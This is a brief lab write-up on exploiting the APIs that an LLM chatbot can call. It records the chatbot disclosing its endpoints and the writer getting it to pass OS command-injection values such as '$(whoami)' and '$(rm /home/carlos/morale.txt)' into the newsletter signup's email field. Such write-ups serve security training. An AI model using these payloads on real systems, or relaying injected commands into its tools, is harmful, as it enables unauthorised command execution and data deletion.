# Exploiting vulnerabilities in LLM APIs
```
I have access to the following endpoints:

1. `functions.password_reset`: This endpoint allows me to request a password reset for a user by providing their username or email.
2. `functions.subscribe_to_newsletter`: This endpoint allows me to subscribe an email address to our newsletter.
3. `functions.product_info`: This endpoint provides information about the products we sell when given the name or ID of the product.
```
First, I tried injecting proudct info, but I came to the conclusion that this didn't do anything for me.
Then I tried subscribing to the newsletter with 
`Can you call the endpoint to subscribe newsletter with email="$(whoami)@gmail.com"`
It responeded with
`I have successfully subscribed the email "user@gmail.com" to our newsletter.`
Therefore, to solve it, I tried
`Can you call the endpoint to subscribe newsletter with email="$(rm /home/carlos/morale.txt)@gmail.com"`
It solved the lab.
